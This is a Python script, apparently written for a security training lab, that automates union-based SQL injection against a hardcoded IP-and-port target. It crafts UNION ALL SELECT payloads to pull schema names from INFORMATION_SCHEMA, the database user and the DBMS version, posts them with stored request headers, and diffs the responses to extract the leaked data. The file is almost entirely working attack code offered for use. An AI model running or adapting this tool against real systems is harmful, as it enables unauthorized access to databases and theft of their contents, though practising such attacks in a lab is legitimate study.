import requests
from utils import read_headers_file
import re
from bs4 import BeautifulSoup

"""
id=1 UNION ALL SELECT NULL,NULL,SCHEMA_NAME,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- - #DATABASE
id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -

"""
test = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"



def get_sqli_info(payload):
    data = [
		{"data": "database","value":"", "payload":""},
		{"data": "username","value":"", "payload":""},
		{"data": "version","value":"", "payload":""},
	]
    info = [
		{"payload":"SCHEMA_NAME",	"source":"FROM INFORMATION_SCHEMA.SCHEMATA"}, #Databases
		{"payload":"user()",		"source":""}, #User
		{"payload":"@@version",		"source":""}, # DBMS Version

	]
    cont = 0
    for i in info:
        aux_payload = payload
        aux_payload = aux_payload.replace("payload", i["payload"])
        aux_payload = aux_payload.replace("source", i["source"])
        data[cont]["payload"] = aux_payload
        cont += 1
    return data


def get_request(url):
    response  = requests.get(url)
    return response

def post_request(url, data=None, header= None):
    response = requests.post(url, data, headers= header)
    return response

def string_to_json(payload_str):
    try:
        key_value = payload_str.split('=',1)
        if len(key_value) != 2:
            raise ValueError(f"Formato invalido: {payload_str}")
        key = key_value[0].strip()
        value = key_value[1].strip()
        return {key:value}
    except Exception as e:
        print(f"Error procesando el string: {e}")
        return

def limpiar_html(html):
    """Convierte HTML a texto plano, eliminando etiquetas y espacios innecesarios."""
    soup = BeautifulSoup(html, 'html.parser')
    texto = soup.get_text()
    # Eliminar múltiples espacios en blanco
    texto = re.sub(r'\s+', ' ', texto)
    return texto.strip()

def html_diff(text1, text2):
    
    text1 = limpiar_html(text1)
    text2 = limpiar_html(text2)
    
    word1 = text1.split()
    word2 = text2.split()
    
    different_words = []
    cont = 0
    min_len = min(len(word1),len(word2))
    
    for i in range (min_len):
        if word1[i] != word2[i]:
            different_words.append(word2[i])
    
    if len(word2) > min_len:
        different_words.extend(word2[min_len:])
    return " ".join(different_words)


url = "http://"+"94.237.61.249:34153/case2.php"
headers = read_headers_file("./headers.txt")
payload = {"id": "1"}
response1 = post_request(url, payload, headers).text


payload = string_to_json(test)
response2 = post_request(url, payload, headers).text # Payload OK

aux_payloads = get_sqli_info(test)
database_payload = string_to_json(aux_payloads[0]['payload'])

response3 = post_request(url, database_payload, headers).text
#print(response3)

#Resultado diferente
result = html_diff(response1,response3)
aux_payloads[0]['value'] = result.split()
print(aux_payloads[0])
print(len(aux_payloads))
print(result)